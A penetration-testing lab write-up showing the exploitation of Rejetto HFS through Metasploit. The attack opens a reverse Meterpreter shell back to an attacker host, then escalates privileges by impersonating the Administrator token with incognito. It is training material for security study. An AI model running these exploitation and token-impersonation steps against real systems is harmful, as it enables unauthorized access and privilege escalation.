# In this Lab our goal is to simply list the access tokens available and impersonate them

# the Entry level accesss is by exploitaing the `Rejetto file server` as we did in bypassiing UAC lab

# Exploiting Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)  - `https://www.exploit-db.com/exploits/39161`

root@attackdefense:~# `nmap 10.5.28.108`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-23 11:25 IST
Nmap scan report for 10.5.28.108
Host is up (0.0019s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
root@attackdefense:~# `nmap 10.5.28.108 -sV -p 80`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-23 11:25 IST
Nmap scan report for 10.5.28.108
Host is up (0.0018s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds

msf6 > `search rejetto`

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > `use 0`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > `set RHOSTS 10.5.28.108`
RHOSTS => 10.5.28.108
msf6 exploit(windows/http/rejetto_hfs_exec) > `exploit`

[*] Started reverse TCP handler on 10.10.12.3:4444 
[*] Using URL: http://0.0.0.0:8080/znHngjn
[*] Local IP: http://10.10.12.3:8080/znHngjn
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /znHngjn
[*] Sending stage (175174 bytes) to 10.5.28.108
[!] Tried to delete %TEMP%\KDALHxzr.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.12.3:4444 -> 10.5.28.108:49777) at 2023-12-23 11:41:01 +0530
[*] Server stopped.

# We observe that system is wind 2016 and its architecture is 64 bit, so we try to migrate to 64 bit process, however we observe that access is denied , We then check our user id which is `NT AUTHORITY\LOCAL SERVICE` this means we currently have a service account which is by default unprivileged , we can confirm this by getprivs that we have limited privileges.

meterpreter > `sysinfo`
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > `ps`

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System
 84    4     Registry
 260   4     smss.exe
 376   368   csrss.exe
 444   580   svchost.exe
 452   444   csrss.exe
 460   368   wininit.exe
 516   444   winlogon.ex
             e
 580   460   services.ex
             e
 600   460   lsass.exe
 668   580   msdtc.exe
 704   580   svchost.exe
 724   580   svchost.exe
 744   516   fontdrvhost
             .exe
 748   460   fontdrvhost
             .exe
 760   4380  cmd.exe      x86   1        NT AUTHORITY\LOCA  C:\Windows\SysWOW6
                                         L SERVICE          4\cmd.exe
 832   580   svchost.exe
 848   580   svchost.exe
 868   580   svchost.exe
 872   580   svchost.exe
 940   516   dwm.exe
 1000  580   svchost.exe
 1008  580   svchost.exe
 1072  1440  CompatTelRu
             nner.exe
 1140  1072  conhost.exe
 1160  580   svchost.exe
 1184  580   svchost.exe
 1204  580   svchost.exe
 1212  580   svchost.exe
 1224  580   svchost.exe
 1236  580   svchost.exe
 1276  580   svchost.exe
 1316  580   svchost.exe
 1392  580   svchost.exe
 1408  580   svchost.exe
 1440  580   svchost.exe
 1468  580   svchost.exe
 1476  580   svchost.exe
 1564  580   svchost.exe
 1640  580   svchost.exe
 1648  580   svchost.exe
 1728  580   svchost.exe
 1736  580   svchost.exe
 1872  580   svchost.exe
 1892  580   svchost.exe
 2020  580   svchost.exe
 2080  580   svchost.exe
 2100  580   svchost.exe
 2120  580   svchost.exe
 2144  580   amazon-ssm-
             agent.exe
 2232  580   svchost.exe
 2280  580   spoolsv.exe
 2328  580   svchost.exe
 2376  580   svchost.exe
 2460  580   svchost.exe
 2468  580   svchost.exe
 2476  580   svchost.exe
 2500  580   svchost.exe
 2524  580   svchost.exe
 2556  580   svchost.exe
 2612  760   conhost.exe  x64   1        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\conhost.exe
 2752  580   svchost.exe
 2980  5004  wscript.exe  x86   1        NT AUTHORITY\LOCA  C:\Windows\SysWOW6
                                         L SERVICE          4\wscript.exe
 3060  580   svchost.exe
 3152  580   svchost.exe
 3360  3376  explorer.ex  x64   1        ATTACKDEFENSE\Adm  C:\Windows\explore
             e                           inistrator         r.exe
 3416  724   ShellExperi  x64   1        ATTACKDEFENSE\Adm  C:\Windows\SystemA
             enceHost.ex                 inistrator         pps\ShellExperienc
             e                                              eHost_cw5n1h2txyew
                                                            y\ShellExperienceH
                                                            ost.exe
 3456  580   svchost.exe
 3620  580   svchost.exe
 3688  580   svchost.exe
 3708  580   svchost.exe
 3740  1440  taskhostw.e  x64   1        ATTACKDEFENSE\Adm  C:\Windows\System3
             xe                          inistrator         2\taskhostw.exe
 3748  2020  sihost.exe   x64   1        ATTACKDEFENSE\Adm  C:\Windows\System3
                                         inistrator         2\sihost.exe
 3904  580   svchost.exe
 3948  580   svchost.exe
 3968  3904  ctfmon.exe   x64   1        ATTACKDEFENSE\Adm  C:\Windows\System3
                                         inistrator         2\ctfmon.exe
 4124  724   SearchUI.ex  x64   1        ATTACKDEFENSE\Adm  C:\Windows\SystemA
             e                           inistrator         pps\Microsoft.Wind
                                                            ows.Cortana_cw5n1h
                                                            2txyewy\SearchUI.e
                                                            xe
 4152  580   svchost.exe
 4184  724   RuntimeBrok
             er.exe
 4332  724   RuntimeBrok
             er.exe
 4380  2980  ZpXRoGbQd.e  x86   1        NT AUTHORITY\LOCA  C:\Windows\SERVIC~
             xe                          L SERVICE          1\LOCALS~1\AppData
                                                            \Local\Temp\rad6BD
                                                            06.tmp\ZpXRoGbQd.e
                                                            xe
 4516  580   svchost.exe
 4592  580   svchost.exe
 4692  724   RuntimeBrok
             er.exe
 4784  580   svchost.exe
 4904  580   vds.exe
 5004  4972  hfs.exe      x86   1        NT AUTHORITY\LOCA  C:\http-server\hfs
                                         L SERVICE          .exe

meterpreter > `pgrep explorer`
3360
meterpreter > `migrate 3360`
[*] Migrating from 4380 to 3360...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > `getuid`
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

meterpreter > 

# However we have limited privileges only but we can observe that we have `SeImpersonatePrivilege` which means we can utilise this account using meterpreter `incognito` to impersonate other access tokens available

# we now load meterpreter built-in `incognito` module, since we tried to migrate our mererpreter session died so need to exploit again..

meterpreter > `load incognito`
Loading extension incognito...
[-] Failed to load extension: No response was received to the core_enumextcmd request.
meterpreter > `exit`
[*] Shutting down Meterpreter...

[*] 10.5.28.108 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(windows/http/rejetto_hfs_exec) > `exploit`

[*] Started reverse TCP handler on 10.10.12.3:4444 
[*] Using URL: http://0.0.0.0:8080/IjUzLsUYa
[*] Local IP: http://10.10.12.3:8080/IjUzLsUYa
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /IjUzLsUYa
[*] Sending stage (175174 bytes) to 10.5.28.108
[!] Tried to delete %TEMP%\YelYLvcpXU.vbs, unknown result
[*] Meterpreter session 2 opened (10.10.12.3:4444 -> 10.5.28.108:49807) at 2023-12-23 11:55:25 +0530
[*] Sending stage (175174 bytes) to 10.5.28.108
[*] Server stopped.

meterpreter > `load incognito`
Loading extension incognito...Success.

# Now we can check for other access tokens avaialable, we observe that there are 2 delegation tokens (the one which require traditional login or RDP) and no impersonation token (one which dosent require user to login)

meterpreter > `list_tokens -u`
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > 

# We have the Administrator User account access token which can help us to escalate privileges, We observe that we successfull impersonated the admininstrator user,  now if we migrate to 64 bit process it allows us to migrate and if we see our privileges , we can see we have many other privileges of administrator user and also the uid changed to ATTACKDEFENSE\Administrator

meterpreter > `impersonate_token "ATTACKDEFENSE\Administrator"`
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > `getprivs`
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
meterpreter > `migrate 3360`
[*] Migrating from 3076 to 3360...
[*] Migration completed successfully.
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > `getuid`
Server username: ATTACKDEFENSE\Administrator
meterpreter > 

# Finaly we have escalated to Admininstrator privileges...

*****************************************************************************************************************************

# Now since we have already escalated privileges we see additional access tokens which we can impersonate and gain privileges assosiated with that token

meterpreter > `list_tokens -u`
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\NETWORK SERVICE

meterpreter > 

# Now if we observe we have one Delegation Token as `NT AUTHORITY\SYSTEM`, Now there might be case when do not get any access tokens available using `list_tokens -u`, in that case we need to do `patato attack` ie our second technique 

# we basically patatto attack will do is that it will generate you access Token `NT AUTHORITY\SYSTEM`